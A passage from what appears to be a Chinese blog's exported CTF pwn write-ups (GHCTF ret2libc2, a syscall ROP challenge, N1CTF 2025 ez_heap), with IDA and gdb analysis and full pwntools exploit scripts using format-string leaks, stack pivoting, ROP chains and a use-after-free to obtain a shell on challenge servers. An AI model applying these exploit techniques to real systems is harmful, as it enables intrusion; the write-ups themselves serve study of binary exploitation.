class=\"number\">0</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>)   <span class=\"comment\">#reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"GHCTF-ret2libc2\"><a href=\"#GHCTF-ret2libc2\" class=\"headerlink\" title=\"GHCTF ret2libc2\"></a>GHCTF ret2libc2</h1><h2 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"func函数分析\"><a href=\"#func函数分析\" class=\"headerlink\" title=\"func函数分析\"></a>func函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png\" alt=\"98a456adebe8adb789ba9ca00f26a510\"><br>1.程序很简单,main函数里只有init和func，这里直接看到func函数<br>2.可以看到存在一个格式化字符串漏洞和溢出漏洞.<br>3.程序没有提供system和<code>/bin/sh\\x00</code>，需要泄露libc，完成ret2libc.</p>\n<h3 id=\"func汇编分析\"><a href=\"#func汇编分析\" class=\"headerlink\" title=\"func汇编分析\"></a>func汇编分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png\" alt=\"98a456adebe8adb789ba9ca00f26a510\"><br>1.从汇编中可以看到更多信息.<br>2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.<br>3.同时，leave ret 留下了栈迁移的隐患。</p>\n<h3 id=\"gdb调试分析\"><a href=\"#gdb调试分析\" class=\"headerlink\" title=\"gdb调试分析\"></a>gdb调试分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/65dadea8bb2e5a40f2a81d8411fea262_720.png\" alt=\"65dadea8bb2e5a40f2a81d8411fea262.png\"><br>1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6&#x3D;27.<br>2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。</p>\n<h2 id=\"构造思路-1\"><a href=\"#构造思路-1\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。<br>2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。<br>3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。</p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&quot;libc.so.6&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28626)</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">bss=<span class=\"number\">0x404060</span></span><br><span class=\"line\">ret=<span class=\"number\">0x4011fa</span></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;%27$p&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload1=payload1.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(bss+<span class=\"number\">0x900</span>)+p64(<span class=\"number\">0x401227</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload1)</span><br><span class=\"line\">start_addr=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">128</span></span><br><span class=\"line\">libc_base=start_addr-libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;start_addr-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(start_addr)))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">system=libc_base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">one=libc_base+<span class=\"number\">0xebc85</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x38</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"迁移泄露\"><a href=\"#迁移泄露\" class=\"headerlink\" title=\"迁移泄露\"></a>迁移泄露</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28268</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leave_ret=0x</span></span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">complete=<span class=\"number\">0x404070</span></span><br><span class=\"line\">func=<span class=\"number\">0x40121f</span></span><br><span class=\"line\">magic=<span class=\"number\">0x401252</span></span><br><span class=\"line\">bss=elf.bss()+<span class=\"number\">0x500</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">rsp_8=<span class=\"number\">0x401016</span></span><br><span class=\"line\">offset=<span class=\"number\">0x30</span>+<span class=\"number\">8</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;%13$s&#x27;</span>.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x404038</span>)</span><br><span class=\"line\">payload+=p64(func)</span><br><span class=\"line\">payload+=p64(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">read=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;read-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(read)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=read-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">sys=libc_base+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts=libc_base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">printf=libc_base+libc.sym[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">setvbuf=libc_base+libc.sym[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\">bin_sh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">ret=libc_base+<span class=\"number\">0x29139</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)</span><br><span class=\"line\">payload+=p64(bss)+p64(magic)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload=offset * <span class=\"string\">b&#x27;a&#x27;</span></span><br><span class=\"line\">payload+=p64(pop_rdi)</span><br><span class=\"line\">payload+=p64(bin_sh)</span><br><span class=\"line\">payload+=p64(ret)</span><br><span class=\"line\">payload+=p64(sys)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"GHCTF-你真的会布置栈吗？\"><a href=\"#GHCTF-你真的会布置栈吗？\" class=\"headerlink\" title=\"GHCTF 你真的会布置栈吗？\"></a>GHCTF 你真的会布置栈吗？</h1><h2 id=\"ida分析-2\"><a href=\"#ida分析-2\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"start函数分析\"><a href=\"#start函数分析\" class=\"headerlink\" title=\"start函数分析\"></a>start函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/813b6b639a05fd8870ff80b5be117df7.png\" alt=\"813b6b639a05fd8870ff80b5be117df7\"></p>\n<p>1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大<br>2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看</p>\n<h3 id=\"print函数分析\"><a href=\"#print函数分析\" class=\"headerlink\" title=\"print函数分析\"></a>print函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/a36c17d8abe90bc1a9920db0595e982d.png\" alt=\"a36c17d8abe90bc1a9920db0595e982d\"><br>1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.</p>\n<h3 id=\"gadgets-分析\"><a href=\"#gadgets-分析\" class=\"headerlink\" title=\"gadgets 分析\"></a>gadgets 分析</h3><p>1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.<br>2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.<br>3.同时，dispatch留有执行rbx中代码的功能.<br>4.下方还可以控制rdx，rsi，rdi 值为0.</p>\n<h2 id=\"构造思路-2\"><a href=\"#构造思路-2\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。<br>2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax&#x3D;0x3b，可以通过r13 和 <code>xchg rax，r13</code> 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，<code>&quot;/bin/sh\\x00&quot;</code> 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。<br>3.read函数，需要控制rax&#x3D;0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。<br>4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell<br>5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。<br>6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。</p>\n<h2 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"花里胡哨的rop\"><a href=\"#花里胡哨的rop\" class=\"headerlink\" title=\"花里胡哨的rop\"></a>花里胡哨的rop</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28634</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call=<span class=\"number\">0x401077</span></span><br><span class=\"line\">rax_r13=<span class=\"number\">0x40100c</span></span><br><span class=\"line\">data=<span class=\"number\">0x402000</span></span><br><span class=\"line\">gadget_pop=<span class=\"number\">0x401017</span></span><br><span class=\"line\">dispatcher=<span class=\"number\">0x401011</span></span><br><span class=\"line\">xor_rsi=<span class=\"number\">0x401027</span></span><br><span class=\"line\">Free_Gate=<span class=\"number\">0x40101c</span></span><br><span class=\"line\">xor_rdx=<span class=\"number\">0x401021</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(gadget_pop)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">payload+=p64(gadget_pop) <span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(data) <span class=\"comment\">#rsi ,rsp</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> <span class=\"comment\">#rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(rax_r13) <span class=\"comment\">#r15 </span></span><br><span class=\"line\">payload+=p64(Free_Gate)</span><br><span class=\"line\">payload+=p64(sys_call) <span class=\"comment\">#r15   read</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)<span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># r15</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>) <span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(data)+p64(<span class=\"number\">0x3b</span>) <span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(dispatcher)<span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(sys_call)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">payload+=p64(xor_rdx)+p64(rax_r13)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"N1ctf-2025-pwn","cover":"/img/治不开心药.png","_content":"# N1ctf-2025-pwn\n\n## 前言\n## ez_heap\n\n### 静态分析\nstruct：\n```c\nstruct my_struct{\n__int64 name_size;\n__int64 conten_size;\nchar name[16];\n__int64 heap_addr;\n__int64 arry_addr;\n}\n```\n其实是用一个大堆块，每0x30 用来保存一个堆块的相关信息。 每次add，会申请新堆块来保存content\n\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250914201234102.png)\n\n在这里发现，可以通过`*a3` 造成一个uaf 漏洞,配合后面`show()`可以泄露出main_arena,那么就拿到了libc.\n\n但是进一步发现，edit和show 都只能使用一次，而且 `*a3` 为0 时,delete 会返回到v7(由用户控制),但是我们没有任何地址信息.\n\nedit的scanf 虽然有溢出漏洞,但是`\\x00` 截断的问题还是没有解决.如果可以知道pie ,我们可以覆盖heapaddr 为got 表把libc泄露出来.\n\n\n等一下,原本这里是堆的地址,我们现在可以计算目标和这里原地址的偏移,同时已知^运算的另一个数,那么我们其实可以计算最后的结果,嘶~~ .那么就可以把pie泄露出来,接下来就是看能不能正常从edit和show里返回了。\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\n\nlibc=ELF(\"./libc.so.6\")\n\n# 一些阻碍\npas=b\"admin\"+b\":\"+b\"x\"+p8(0xc2)+b\"xxxxxx\"+b\":Junior:1234\"\nkeys=b\"a\"*7\n# gdb.attach(io,'''\n# b *$rebase(0x1C20)\n# b *$rebase(0x1ae4)\n# b *$rebase(0x1C0B)\n# b *$rebase(0x1952)\n# ''')\n# onegadgets\n'''\n0xef52b onegadgets\n0xef4ce onegadgets\n0x3F60 puts\n0x4080 \nb *$rebase(0x1D4C)\n'''\ndef key():\n    io.sendlineafter(\"Please enter your key:\\n\",keys)\n\ndef add(name,size,content):\n    io.sendlineafter(\"Please enter your choice.~~\",str(1))\n    key()\n    io.sendafter(\"name:(size<16)\\n\",name)\n    io.sendlineafter(\"content size:(size<=0x70)\\n\",str(size))\n    io.sendafter(\"content:\\n\",content)\n\ndef delete(idx,num):\n    io.sendlineafter(\"Please enter your choice.~~\\n\",str(2))\n    key()\n    io.sendlineafter(\"index:\\n\",str(idx))\n    io.sendlineafter(\"numbers:\\n\",num)\n\ndef show(idx):\n    io.sendlineafter(\"Please enter your choice.~~\\n\",str(3))\n    key()\n    io.sendlineafter(\"index:\\n\",str(idx))\n\ndef edit(idx,name):\n    io.sendlineafter(\"Please enter your choice.~~\\n\",str(4))\n    key()\n    io.sendlineafter(\"index:\\n\",str(idx))\n    io.sendlineafter(\"name:(size<16)\\n\",name)\none=[0xef52b,0xef4ce]\nname=b\"a\"*0xf\nmain=0x1CCB\nmenu=0x1DA1\n\ndef pwn():\n    io.sendlineafter(\"Do you want to play a game with me?\\n\",pas)\n    add(name,0x68,b'a\\n')\n    add(name,0x68,b'b\\n')\n    add(name,0x68,b'c\\n')\n    add(name,0x68,b'd\\n')\n    # leak pie heap\n    payload=name+b\"\\x00\"+b\"\\xba\"\n    edit(0,payload)\n    show(0)\n    io.recvuntil(\"content: \")\n    heap=u64(io.recv(6).rjust(8,b\"\\x00\"))\n    pie=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x4080\n    logv(\"pie\",hex(pie))\n    logv(\"heap\",hex(heap))\n    delete(1,str(pie+main).encode())\n    # count & leak libc\n\n    puts_got=elf.got[\"puts\"]+pie\n    puts_encode=puts_got ^ 0x787878787878c278\n    payload=name+b\"\\x00\"+p64(puts_encode)\n    io.sendlineafter(\"Do you want to play a game with me?\\n\",pas)\n    edit(2,payload)\n    show(2)\n    io.recvuntil(\"content: \")\n    puts=u64(io.recv(6).ljust(8,b\"\\x00\"))\n    libc_base=puts-libc.sym[\"puts\"]\n    logv(\"puts\",hex(puts))\n    logv(\"libc_base\",hex(libc_base))\n    getshell=libc_base+one[0]\n    delete(1,str(getshell).encode())\n    \n    \nwhile True:\n    try:\n        io,elf=loadfile(\"./heap\",\"\",0)\n        pwn()\n        io.interactive()\n    except:\n        io.close()\n\n\n\n```\n\n## ez_jail\n\n## 静态分析\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250920223356355.png)\n\nuaf可以配合`show`,泄露main_arena 信息来泄露libc ,但是要如何利用呢?\n\n","source":"_posts/ctf比赛复现/N1ctf-2025-pwn.md","raw":"---\ntitle: N1ctf-2025-pwn\ntags:\n    - heap\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# N1ctf-2025-pwn\n\n## 前言\n## ez_heap\n\n### 静态分析\nstruct：\n```c\nstruct my_struct{\n__int64 name_size;\n__int64 conten_size;\nchar name[16];\n__int64 heap_addr;\n__int64 arry_addr;\n}\n```\n其实是用一个大堆块，每0x30 用来保存一个堆块的相关信息。 每次add，会申请新堆块来保存content\n\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250914201234102.png)\n\n在这里发现，可以通过`*a3` 造成一个uaf 漏洞,配合后面`show()`可以泄露出main_arena,那么就拿到了libc.\n\n但是进一步发现，edit和show 都只能使用一次，而且 `*a3` 为0 时,delete 会返回到v7(由用户控制),但是我们没有任何地址信息.\n\nedit的scanf 虽然有溢出漏洞,但是`\\x00` 截断的问题还是没有解决.如果可以知道pie ,我们可以覆盖heapaddr 为got 表把libc泄露出来.\n\n\n等一下,原本这里是堆的地址,我们现在可以计算目标和这里原地址的偏移,同时已知^运算的另一个数,那么我们其实可以计算最后的结果,嘶~~ .那么就可以把pie泄露出来,接下来就是看能不能正常从edit和show里返回了。\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\n\nlibc=ELF(\"./libc.so.6\")\n\n# 一些阻碍\npas=b\"admin\"+b\":\"+b\"x\"+p8(0xc2)+b\"xxxxxx\"+b\":Junior:1234\"\nkeys=b\"a\"*7\n# gdb.attach(io,'''\n# b *$rebase(0x1C20)\n# b *$rebase(0x1ae4)\n# b *$rebase(0x1C0B)\n# b *$rebase(0x1952)\n# ''')\n# onegadgets\n'''\n0xef52b onegadgets\n0xef4ce onegadgets\n0x3F60 puts\n0x4080 \nb *$rebase(0x1D4C)\n'''\ndef key():\n    io.sendlineafter(\"Please enter your key:\\n\",keys)\n\ndef add(name,size,content):\n    io.sendlineafter(\"Please enter your choice.~~\",str(1))\n    key()\n    io.sendafter(\"name:(size<16)\\n\",name)\n    io.sendlineafter(\"content size:(size<=0x70)\\n\",str(size))\n    io.sendafter(\"content:\\n\",content)\n\ndef delete(idx,num):\n    io.sendlineafter(\"Please enter your choice.~~\\n\",str(2))\n    key()\n    io.sendlineafter(\"index:\\n\",str(idx))\n    io.sendlineafter(\"numbers:\\n\",num)\n\ndef show(idx):\n    io.sendlineafter(\"Please enter your choice.~~\\n\",str(3))\n    key()\n    io.sendlineafter(\"index:\\n\",str(idx))\n\ndef edit(idx,name):\n    io.sendlineafter(\"Please enter your choice.~~\\n\",str(4))\n    key()\n    io.sendlineafter(\"index:\\n\",str(idx))\n    